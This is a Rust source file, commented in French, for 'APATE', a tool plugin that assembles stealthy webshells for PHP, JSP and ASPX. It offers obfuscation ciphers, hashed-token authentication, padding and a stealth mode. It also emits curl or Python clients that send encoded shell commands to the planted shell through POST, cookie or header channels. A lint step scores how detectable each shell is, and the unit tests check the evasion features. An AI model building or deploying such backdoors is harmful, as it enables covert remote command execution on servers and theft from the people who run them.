//! APATE — forge de webshells furtifs. Assemble un shell à partir de briques
//! indépendantes puis mesure sa propre exposition.

mod lint;
mod rng;
mod shells;

use rng::Rng;
use serde_json::{Map, Value, json};
use shells::{Action, Auth, Cipher, Lang, Mode, Spec, Transport};

wit_bindgen::generate!({ path: "../../engine/wit", world: "ktrx-tool" });

const VERSION: &str = "1.0.0";
const DEFAULT_MAX_BYTES: u64 = 1_048_576;

struct Plugin;

fn progress(phase: &str, current: u32, total: u32, done: bool) {
    let _ = ktrx::tool::host::request(
        "progress.update",
        &json!({
            "phase": phase,
            "current": current,
            "total": total,
            "item_label": "étapes",
            "result_label": "octets",
            "done": done
        })
        .to_string(),
    );
}

fn gs(o: &Map<String, Value>, k: &str) -> Option<String> {
    o.get(k)
        .and_then(Value::as_str)
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
}

fn gb(o: &Map<String, Value>, k: &str, d: bool) -> bool {
    match o.get(k) {
        Some(Value::Bool(b)) => *b,
        Some(Value::String(s)) => s == "true" || s == "1",
        Some(Value::Number(n)) => n.as_u64().unwrap_or(0) > 0,
        _ => d,
    }
}

fn gi(o: &Map<String, Value>, k: &str, d: u64) -> u64 {
    match o.get(k) {
        Some(Value::Number(n)) => n.as_u64().unwrap_or(d),
        Some(Value::String(s)) => s.trim().parse().unwrap_or(d),
        _ => d,
    }
}

fn pick_enum<T: Copy>(
    o: &Map<String, Value>,
    k: &str,
    table: &[(&str, T)],
    d: T,
) -> Result<T, String> {
    match gs(o, k) {
        None => Ok(d),
        Some(v) => {
            let lv = v.to_lowercase();
            for (name, val) in table {
                if *name == lv {
                    return Ok(*val);
                }
            }
            Err(format!(
                "valeur invalide pour {k} : {v} (attendu : {})",
                table.iter().map(|(n, _)| *n).collect::<Vec<_>>().join(", ")
            ))
        }
    }
}

fn fnv(data: &str) -> u64 {
    let mut h: u64 = 0xcbf2_9ce4_8422_2325;
    for b in data.as_bytes() {
        h ^= *b as u64;
        h = h.wrapping_mul(0x0000_0100_0000_01b3);
    }
    h
}

fn lang_name(l: Lang) -> &'static str {
    match l {
        Lang::Php => "php",
        Lang::Jsp => "jsp",
        Lang::Aspx => "aspx",
    }
}

fn action_name(a: Action) -> &'static str {
    match a {
        Action::Exec => "exec",
        Action::Eval => "eval",
        Action::File => "file",
        Action::All => "all",
    }
}

fn mode_name(m: Mode) -> &'static str {
    match m {
        Mode::Simple => "simple",
        Mode::Advanced => "advanced",
        Mode::Stealth => "stealth",
    }
}

fn transport_name(t: Transport) -> &'static str {
    match t {
        Transport::Post => "post",
        Transport::Cookie => "cookie",
        Transport::Header => "header",
    }
}

fn cipher_name(c: Cipher) -> &'static str {
    match c {
        Cipher::None => "none",
        Cipher::B64 => "b64",
        Cipher::Gzinflate => "gzinflate",
        Cipher::Xor => "xor",
        Cipher::Rot13 => "rot13",
        Cipher::Layered => "layered",
    }
}

fn auth_name(a: Auth) -> &'static str {
    match a {
        Auth::None => "none",
        Auth::Plain => "plain",
        Auth::Md5 => "md5",
        Auth::Sha1 => "sha1",
    }
}

fn ext(l: Lang) -> &'static str {
    match l {
        Lang::Php => "php",
        Lang::Jsp => "jsp",
        Lang::Aspx => "aspx",
    }
}

// ---------------------------------------------------------------- hachage

const MD5_K: [u32; 64] = [
    0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee, 0xf57c0faf, 0x4787c62a, 0xa8304613, 0xfd469501,
    0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193, 0xa679438e, 0x49b40821,
    0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa, 0xd62f105d, 0x02441453, 0xd8a1e681, 0xe7d3fbc8,
    0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed, 0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a,
    0xfffa3942, 0x8771f681, 0x6d9d6122, 0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70,
    0x289b7ec6, 0xeaa127fa, 0xd4ef3085, 0x04881d05, 0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665,
    0xf4292244, 0x432aff97, 0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
    0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1, 0xf7537e82, 0xbd3af235, 0x2ad7d2bb, 0xeb86d391,
];

const MD5_S: [u32; 64] = [
    7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9,
    14, 20, 5, 9, 14, 20, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 6, 10, 15,
    21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21,
];

fn md5_hex(input: &[u8]) -> String {
    let mut a0: u32 = 0x67452301;
    let mut b0: u32 = 0xefcdab89;
    let mut c0: u32 = 0x98badcfe;
    let mut d0: u32 = 0x10325476;

    let mut msg = input.to_vec();
    let bitlen = (input.len() as u64).wrapping_mul(8);
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0);
    }
    msg.extend_from_slice(&bitlen.to_le_bytes());

    for chunk in msg.chunks_exact(64) {
        let mut m = [0u32; 16];
        for i in 0..16 {
            m[i] = u32::from_le_bytes([
                chunk[i * 4],
                chunk[i * 4 + 1],
                chunk[i * 4 + 2],
                chunk[i * 4 + 3],
            ]);
        }
        let (mut a, mut b, mut c, mut d) = (a0, b0, c0, d0);
        for i in 0..64 {
            let (f, g) = match i / 16 {
                0 => ((b & c) | (!b & d), i),
                1 => ((d & b) | (!d & c), (5 * i + 1) % 16),
                2 => (b ^ c ^ d, (3 * i + 5) % 16),
                _ => (c ^ (b | !d), (7 * i) % 16),
            };
            let tmp = d;
            d = c;
            c = b;
            let sum = a.wrapping_add(f).wrapping_add(MD5_K[i]).wrapping_add(m[g]);
            b = b.wrapping_add(sum.rotate_left(MD5_S[i]));
            a = tmp;
        }
        a0 = a0.wrapping_add(a);
        b0 = b0.wrapping_add(b);
        c0 = c0.wrapping_add(c);
        d0 = d0.wrapping_add(d);
    }

    let mut out = String::with_capacity(32);
    for v in [a0, b0, c0, d0] {
        for b in v.to_le_bytes() {
            out.push_str(&format!("{:02x}", b));
        }
    }
    out
}

fn sha1_hex(input: &[u8]) -> String {
    let mut h: [u32; 5] = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0];
    let mut msg = input.to_vec();
    let bitlen = (input.len() as u64).wrapping_mul(8);
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0);
    }
    msg.extend_from_slice(&bitlen.to_be_bytes());

    for chunk in msg.chunks_exact(64) {
        let mut w = [0u32; 80];
        for i in 0..16 {
            w[i] = u32::from_be_bytes([
                chunk[i * 4],
                chunk[i * 4 + 1],
                chunk[i * 4 + 2],
                chunk[i * 4 + 3],
            ]);
        }
        for i in 16..80 {
            w[i] = (w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]).rotate_left(1);
        }
        let (mut a, mut b, mut c, mut d, mut e) = (h[0], h[1], h[2], h[3], h[4]);
        for i in 0..80 {
            let (f, k) = match i / 20 {
                0 => ((b & c) | (!b & d), 0x5A827999u32),
                1 => (b ^ c ^ d, 0x6ED9EBA1),
                2 => ((b & c) | (b & d) | (c & d), 0x8F1BBCDC),
                _ => (b ^ c ^ d, 0xCA62C1D6),
            };
            let tmp = a
                .rotate_left(5)
                .wrapping_add(f)
                .wrapping_add(e)
                .wrapping_add(k)
                .wrapping_add(w[i]);
            e = d;
            d = c;
            c = b.rotate_left(30);
            b = a;
            a = tmp;
        }
        h[0] = h[0].wrapping_add(a);
        h[1] = h[1].wrapping_add(b);
        h[2] = h[2].wrapping_add(c);
        h[3] = h[3].wrapping_add(d);
        h[4] = h[4].wrapping_add(e);
    }

    h.iter().map(|v| format!("{:08x}", v)).collect()
}

// ---------------------------------------------------------------- client

fn subst(tpl: &str, pairs: &[(&str, String)]) -> String {
    let mut s = String::from(tpl);
    for (k, v) in pairs {
        s = s.replace(k, v);
    }
    s
}

fn encode_py(c: Cipher, raw: &str, key: &str) -> String {
    match c {
        Cipher::None => format!("{raw:?}"),
        Cipher::B64 => format!("__b64({raw:?})"),
        Cipher::Gzinflate => format!("__gz({raw:?})"),
        Cipher::Rot13 => format!("__r13({raw:?})"),
        Cipher::Xor => format!("__xor({raw:?}, KEY)"),
        Cipher::Layered => format!("__r13(__xor(__gz({raw:?}), KEY))"),
    }
}

const PY_CLIENT: &str = r#"import base64, zlib, sys, urllib.request, urllib.parse

KEY = @@KEY@@
URL = "@@URL@@"
AUTH = ("@@AP@@", "@@TOKEN@@")
PARAM = "@@PARAM@@"
TRANSPORT = "@@TR@@"

def __r13(s):
    return s.translate(str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm"))

def __xor(s, k):
    return "".join(chr(ord(c) ^ ord(k[i % len(k)])) for i, c in enumerate(s))

def __gz(s):
    c = zlib.compressobj(9, zlib.DEFLATED, -15)
    return base64.b64encode(c.compress(s.encode()) + c.flush()).decode()

def __b64(s):
    return base64.b64encode(s.encode()).decode()

def envoyer(payload):
    data = @@ENC@@
    if TRANSPORT == "post":
        body = urllib.parse.urlencode({PARAM: data, AUTH[0]: AUTH[1]}).encode()
        req = urllib.request.Request(URL, data=body)
    elif TRANSPORT == "cookie":
        req = urllib.request.Request(URL)
        req.add_header("Cookie", AUTH[0] + "=" + AUTH[1] + "; " + PARAM + "=" + data)
    else:
        req = urllib.request.Request(URL)
        req.add_header(AUTH[0], AUTH[1])
        req.add_header(PARAM, data)
    return urllib.request.urlopen(req).read().decode(errors="replace")

if __name__ == "__main__":
    print(envoyer("e:" + " ".join(sys.argv[1:])))
"#;

fn client(s: &Spec, token: &str) -> String {
    let url = format!("http://HOTE/shell.{}", ext(s.lang));
    let bash_ok = matches!(s.cipher, Cipher::None | Cipher::B64 | Cipher::Rot13);

    if bash_ok {
        let enc = |payload: &str| -> String {
            match s.cipher {
                Cipher::B64 => format!("printf '%s' '{payload}' | base64 -w0"),
                Cipher::Rot13 => {
                    format!("printf '%s' '{payload}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'")
                }
                _ => format!("printf '%s' '{payload}'"),
            }
        };
        let mut out = String::from("# exec\n");
        match s.transport {
            Transport::Post => out.push_str(&format!(
                "$({}) | curl -sS -X POST '{}' --data-urlencode '{}@-' -d '{}={}'\n",
                enc("e:id"),
                url,
                s.param,
                s.auth_param,
                token
            )),
            Transport::Cookie => out.push_str(&format!(
                "curl -sS '{}' -H \"Cookie: {}={}; {}=$({})\"\n",
                url,
                s.auth_param,
                token,
                s.param,
                enc("e:id")
            )),
            Transport::Header => out.push_str(&format!(
                "curl -sS '{}' -H '{}: {}' -H \"{}: $({})\"\n",
                url,
                s.auth_param,
                token,
                s.param,
                enc("e:id")
            )),
        }
        return out;
    }

    subst(
        PY_CLIENT,
        &[
            ("@@KEY@@", format!("{:?}", s.key)),
            ("@@URL@@", url),
            ("@@AP@@", s.auth_param.clone()),
            ("@@TOKEN@@", token.to_string()),
            ("@@PARAM@@", s.param.clone()),
            ("@@TR@@", transport_name(s.transport).to_string()),
            ("@@ENC@@", encode_py(s.cipher, "payload", &s.key)),
        ],
    )
}

// ---------------------------------------------------------------- cœur

fn run_inner(input: &str) -> Result<Value, String> {
    let args: Value =
        serde_json::from_str(input).map_err(|e| format!("arguments JSON invalides : {e}"))?;
    let o = args
        .as_object()
        .ok_or("les arguments doivent être un objet JSON")?;

    let lang = pick_enum(
        o,
        "language",
        &[("php", Lang::Php), ("jsp", Lang::Jsp), ("aspx", Lang::Aspx)],
        Lang::Php,
    )?;
    let action = pick_enum(
        o,
        "action",
        &[
            ("exec", Action::Exec),
            ("eval", Action::Eval),
            ("file", Action::File),
            ("all", Action::All),
        ],
        Action::Exec,
    )?;
    let mode = pick_enum(
        o,
        "mode",
        &[
            ("simple", Mode::Simple),
            ("advanced", Mode::Advanced),
            ("stealth", Mode::Stealth),
        ],
        Mode::Advanced,
    )?;
    let transport = pick_enum(
        o,
        "transport",
        &[
            ("post", Transport::Post),
            ("cookie", Transport::Cookie),
            ("header", Transport::Header),
        ],
        Transport::Post,
    )?;
    let cipher = pick_enum(
        o,
        "cipher",
        &[
            ("none", Cipher::None),
            ("b64", Cipher::B64),
            ("gzinflate", Cipher::Gzinflate),
            ("xor", Cipher::Xor),
            ("rot13", Cipher::Rot13),
            ("layered", Cipher::Layered),
        ],
        Cipher::B64,
    )?;
    let auth = pick_enum(
        o,
        "auth",
        &[
            ("none", Auth::None),
            ("plain", Auth::Plain),
            ("md5", Auth::Md5),
            ("sha1", Auth::Sha1),
        ],
        Auth::Md5,
    )?;
    let output = pick_enum(
        o,
        "output",
        &[("raw", 0u8), ("json", 1u8), ("bundle", 2u8)],
        0u8,
    )?;

    let param = gs(o, "param").unwrap_or_else(|| "p".to_string());
    let auth_param = gs(o, "auth-param").unwrap_or_else(|| "k".to_string());
    for (name, v) in [("param", &param), ("auth_param", &auth_param)] {
        if !v
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
        {
            return Err(format!(
                "{name} doit être alphanumérique (tiret et souligné admis)"
            ));
        }
    }

    let mut warnings: Vec<String> = Vec::new();
    let mut seed = gi(o, "seed", 0);
    let mut token = gs(o, "token").unwrap_or_default();
    let mut key = gs(o, "key").unwrap_or_default();

    if seed == 0 {
        seed = fnv(&format!(
            "{}|{}|{}|{}|{}|{}|{}|{}|{}",
            lang_name(lang),
            mode_name(mode),
            action_name(action),
            transport_name(transport),
            cipher_name(cipher),
            auth_name(auth),
            param,
            token,
            key
        ));
    }
    let mut r = Rng::new(seed);

    let mut token_generated = false;
    let mut key_generated = false;

    if auth != Auth::None && token.is_empty() {
        token = r.alnum(18);
        token_generated = true;
        warnings.push("aucun token fourni : secret généré, conservez-le pour vos appels".into());
    }
    if matches!(cipher, Cipher::Xor | Cipher::Layered) {
        if key.is_empty() {
            key = r.alnum(14);
            key_generated = true;
            warnings.push("aucune clé XOR fournie : clé générée, nécessaire au client".into());
        } else if key.chars().count() < 4 {
            return Err("la clé XOR doit faire au moins 4 caractères".into());
        }
    }

    if transport == Transport::Header {
        warnings
            .push("transport header : les noms de paramètres sont abaissés en minuscules".into());
    }
    if mode == Mode::Stealth && lang != Lang::Php {
        warnings.push("mode stealth : reconstructions de noms surtout actives en PHP".into());
    }
    if action.eval() && lang == Lang::Jsp {
        warnings.push(
            "action eval en JSP : un JDK (javax.tools) doit être présent sur la cible".into(),
        );
    }
    if action.eval() && lang == Lang::Aspx {
        warnings.push("action eval en ASPX : dépend de Microsoft.CSharp sur la cible".into());
    }

    let secret = match auth {
        Auth::Md5 => md5_hex(token.as_bytes()),
        Auth::Sha1 => sha1_hex(token.as_bytes()),
        _ => token.clone(),
    };

    let spec = Spec {
        lang,
        mode,
        action,
        transport,
        cipher,
        auth,
        param: param.clone(),
        auth_param: auth_param.clone(),
        secret: secret.clone(),
        key: key.clone(),
        pad: gb(o, "pad", false),
        decoy: gb(o, "decoy", false),
        minify: gb(o, "minify", false),
        comments: gb(o, "comments", false),
        seed,
    };

    progress("rendu", 1, 3, false);
    let mut code = shells::build(&spec, &mut r);
    if spec.minify {
        code = shells::minify(spec.lang, &code);
        if spec.pad {
            warnings.push("pad ignoré lorsque minify est actif".into());
        }
    } else if spec.pad {
        code = shells::pad(&code, &mut r);
    }

    let max_bytes = gi(o, "max-bytes", DEFAULT_MAX_BYTES) as usize;
    if code.len() > max_bytes {
        return Err(format!(
            "shell de {} octets, au-delà de la limite de {} : réduire action ou désactiver pad",
            code.len(),
            max_bytes
        ));
    }

    progress("analyse", 2, 3, false);
    let hits = lint::scan(&code);
    let risk = lint::risk(&hits);

    progress("rapport", 3, 3, true);

    let mut out = Map::new();
    out.insert("language".into(), json!(lang_name(lang)));
    out.insert("action".into(), json!(action_name(action)));
    out.insert("mode".into(), json!(mode_name(mode)));
    out.insert("transport".into(), json!(transport_name(transport)));
    out.insert("cipher".into(), json!(cipher_name(cipher)));
    out.insert("auth".into(), json!(auth_name(auth)));
    out.insert("param".into(), json!(param));
    out.insert("auth_param".into(), json!(auth_param));
    out.insert("token".into(), json!(token));
    out.insert("token_generated".into(), json!(token_generated));
    out.insert("secret_embedded".into(), json!(secret));
    out.insert(
        "key".into(),
        json!(if key.is_empty() {
            Value::Null
        } else {
            json!(key)
        }),
    );
    out.insert("key_generated".into(), json!(key_generated));
    out.insert("seed".into(), json!(seed));
    out.insert("bytes".into(), json!(code.len()));
    out.insert("lines".into(), json!(code.lines().count()));
    out.insert("fnv1a64".into(), json!(format!("{:016x}", fnv(&code))));
    out.insert("risk".into(), json!(risk));
    out.insert(
        "signatures".into(),
        json!(
            hits.iter()
                .map(|(id, sev, hint)| json!({"id": id, "severity": sev, "hint": hint}))
                .collect::<Vec<_>>()
        ),
    );
    out.insert("warnings".into(), json!(warnings));
    out.insert("code".into(), json!(code));

    if output >= 1 {
        out.insert("engine_version".into(), json!(VERSION));
    }
    if output == 2 {
        out.insert("client".into(), json!(client(&spec, &token)));
    }

    Ok(Value::Object(out))
}

impl exports::ktrx::tool::tool::Guest for Plugin {
    fn run(input: String) -> String {
        match run_inner(&input) {
            Ok(value) => value.to_string(),
            Err(error) => json!({ "error": error }).to_string(),
        }
    }
}

export!(Plugin);

#[cfg(test)]
mod tests {
    use super::*;

    fn args(pairs: &[(&str, Value)]) -> String {
        let mut m = Map::new();
        for (k, v) in pairs {
            m.insert((*k).into(), v.clone());
        }
        serde_json::to_string(&Value::Object(m)).unwrap()
    }

    fn run_ok(pairs: &[(&str, Value)]) -> Value {
        run_inner(&args(pairs)).unwrap()
    }

    #[test]
    fn md5_known_vector() {
        assert_eq!(md5_hex(b"abc"), "900150983cd24fb0d6963f7d28e17f72");
        assert_eq!(md5_hex(b""), "d41d8cd98f00b204e9800998ecf8427e");
    }

    #[test]
    fn sha1_known_vector() {
        assert_eq!(sha1_hex(b"abc"), "a9993e364706816aba3e25717850c26c9cd0d89d");
    }

    #[test]
    fn php_baseline_renders() {
        let v = run_ok(&[("language", json!("php")), ("token", json!("secret"))]);
        let code = v["code"].as_str().unwrap();
        assert!(code.starts_with("<?php"));
        assert!(code.contains("switch("));
        assert!(code.contains("case 'e':"));
    }

    #[test]
    fn determinism_on_same_seed() {
        let a = run_ok(&[
            ("language", json!("php")),
            ("seed", json!(42)),
            ("token", json!("x")),
        ]);
        let b = run_ok(&[
            ("language", json!("php")),
            ("seed", json!(42)),
            ("token", json!("x")),
        ]);
        assert_eq!(a["code"], b["code"]);
    }

    #[test]
    fn seed_changes_output() {
        let a = run_ok(&[
            ("language", json!("php")),
            ("seed", json!(1)),
            ("token", json!("x")),
        ]);
        let b = run_ok(&[
            ("language", json!("php")),
            ("seed", json!(2)),
            ("token", json!("x")),
        ]);
        assert_ne!(a["code"], b["code"]);
    }

    #[test]
    fn all_languages_render() {
        for l in ["php", "jsp", "aspx"] {
            let v = run_ok(&[("language", json!(l)), ("token", json!("t"))]);
            assert!(!v["code"].as_str().unwrap().is_empty());
        }
    }

    #[test]
    fn all_actions_render_in_every_language() {
        for l in ["php", "jsp", "aspx"] {
            for a in ["exec", "eval", "file", "all"] {
                let v = run_ok(&[
                    ("language", json!(l)),
                    ("action", json!(a)),
                    ("token", json!("t")),
                ]);
                assert!(!v["code"].as_str().unwrap().is_empty());
            }
        }
    }

    #[test]
    fn md5_auth_embeds_hash_not_secret() {
        let v = run_ok(&[
            ("language", json!("php")),
            ("auth", json!("md5")),
            ("token", json!("abc")),
        ]);
        let code = v["code"].as_str().unwrap();
        assert!(code.contains("900150983cd24fb0d6963f7d28e17f72"));
        assert!(!code.contains("'abc'"));
        assert_eq!(v["token"], json!("abc"));
        assert_eq!(
            v["secret_embedded"],
            json!("900150983cd24fb0d6963f7d28e17f72")
        );
    }

    #[test]
    fn plain_auth_embeds_secret() {
        let v = run_ok(&[
            ("language", json!("php")),
            ("auth", json!("plain")),
            ("token", json!("abc")),
        ]);
        assert!(v["code"].as_str().unwrap().contains("'abc'"));
    }

    #[test]
    fn token_generated_when_missing() {
        let v = run_ok(&[("language", json!("php"))]);
        assert_eq!(v["token_generated"], json!(true));
        assert!(!v["token"].as_str().unwrap().is_empty());
    }

    #[test]
    fn key_generated_for_xor() {
        let v = run_ok(&[
            ("language", json!("php")),
            ("cipher", json!("xor")),
            ("token", json!("t")),
        ]);
        assert_eq!(v["key_generated"], json!(true));
    }

    #[test]
    fn short_key_rejected() {
        let e = run_inner(&args(&[
            ("language", json!("php")),
            ("cipher", json!("xor")),
            ("key", json!("ab")),
            ("token", json!("t")),
        ]))
        .unwrap_err();
        assert!(e.contains("4"));
    }

    #[test]
    fn unknown_language_rejected() {
        let e = run_inner(&args(&[("language", json!("perl"))])).unwrap_err();
        assert!(e.contains("language"));
    }

    #[test]
    fn minify_shortens_output() {
        let a = run_ok(&[("language", json!("php")), ("token", json!("t"))]);
        let b = run_ok(&[
            ("language", json!("php")),
            ("token", json!("t")),
            ("minify", json!(true)),
        ]);
        assert!(b["bytes"].as_u64().unwrap() < a["bytes"].as_u64().unwrap());
    }

    #[test]
    fn max_bytes_enforced() {
        let e = run_inner(&args(&[
            ("language", json!("php")),
            ("token", json!("t")),
            ("max-bytes", json!(10)),
        ]))
        .unwrap_err();
        assert!(e.contains("limite"));
    }

    #[test]
    fn lint_flags_eval() {
        let v = run_ok(&[
            ("language", json!("php")),
            ("action", json!("eval")),
            ("token", json!("t")),
        ]);
        let ids: Vec<&str> = v["signatures"]
            .as_array()
            .unwrap()
            .iter()
            .map(|s| s["id"].as_str().unwrap())
            .collect();
        assert!(ids.contains(&"php.eval"));
    }

    #[test]
    fn bundle_carries_client() {
        let v = run_ok(&[
            ("language", json!("php")),
            ("token", json!("t")),
            ("output", json!("bundle")),
        ]);
        assert!(v["client"].as_str().unwrap().contains("curl"));
    }

    #[test]
    fn bundle_python_for_layered() {
        let v = run_ok(&[
            ("language", json!("php")),
            ("token", json!("t")),
            ("cipher", json!("layered")),
            ("key", json!("clef")),
            ("output", json!("bundle")),
        ]);
        assert!(v["client"].as_str().unwrap().contains("import base64"));
    }

    #[test]
    fn stealth_rebuilds_function_name() {
        let v = run_ok(&[
            ("language", json!("php")),
            ("mode", json!("stealth")),
            ("token", json!("t")),
        ]);
        assert!(v["code"].as_str().unwrap().contains("array_map('chr'"));
    }

    #[test]
    fn bad_param_charset_rejected() {
        let e = run_inner(&args(&[
            ("language", json!("php")),
            ("param", json!("a b")),
        ]))
        .unwrap_err();
        assert!(e.contains("param"));
    }

    #[test]
    fn error_shape_is_json() {
        let out = Plugin::run("{pas du json".to_string());
        let v: Value = serde_json::from_str(&out).unwrap();
        assert!(v["error"].is_string());
    }
}
